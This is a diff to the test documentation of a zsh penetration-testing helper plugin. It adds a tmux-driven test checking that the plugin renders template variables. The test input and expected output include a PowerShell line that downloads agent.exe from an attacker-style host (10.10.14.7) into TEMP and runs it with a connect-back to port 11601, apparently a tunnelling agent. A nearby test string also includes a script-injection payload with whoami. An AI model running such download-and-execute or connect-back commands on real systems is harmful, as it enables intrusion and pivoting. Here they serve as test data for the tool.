@@ -177,6 +177,40 @@ Expected buffer:
 <script>alert('a b/c;whoami & test')</script>
 ```
 
+## Input Render Test
+
+This verifies that `ii p -input` renders lowercase variables, leaves uppercase
+and PowerShell scope variables unchanged, stops at `EOF`, and copies only the
+rendered body when `--copy` is used.
+
+```zsh
+tmux kill-session -t codex-ii-input 2>/dev/null || true
+tmux new-session -d -s codex-ii-input -x 160 -y 60 zsh
+tmux send-keys -t codex-ii-input "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-input "source ./ii.plugin.zsh" Enter
+tmux send-keys -t codex-ii-input "ii s lhost 10.10.14.7" Enter
+tmux send-keys -t codex-ii-input "file=/tmp/drop/agent.exe" Enter
+tmux send-keys -t codex-ii-input "II_CLIP_CMD='tmux load-buffer -' ii p -input --copy" Enter
+tmux send-keys -t codex-ii-input '$KALI = "$lhost"' Enter
+tmux send-keys -t codex-ii-input '$FILE = "${file:t}"' Enter
+tmux send-keys -t codex-ii-input 'Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"' Enter
+tmux send-keys -t codex-ii-input '& "$env:TEMP\$FILE" --connect $missing:11601 -selfcert' Enter
+tmux send-keys -t codex-ii-input 'EOF' Enter
+sleep 2
+tmux capture-pane -t codex-ii-input -p -S -120
+tmux show-buffer
+tmux kill-session -t codex-ii-input
+```
+
+Expected buffer:
+
+```text
+$KALI = "10.10.14.7"
+$FILE = "agent.exe"
+Invoke-WebRequest "http://${KALI}/net/ligo/${FILE}" -OutFile "$env:TEMP\${RFILE}"
+& "$env:TEMP\$FILE" --connect :11601 -selfcert
+```
+
 ## OSC52 Sequence Test
 
 This verifies that the OSC52 backend encodes special-character payload text
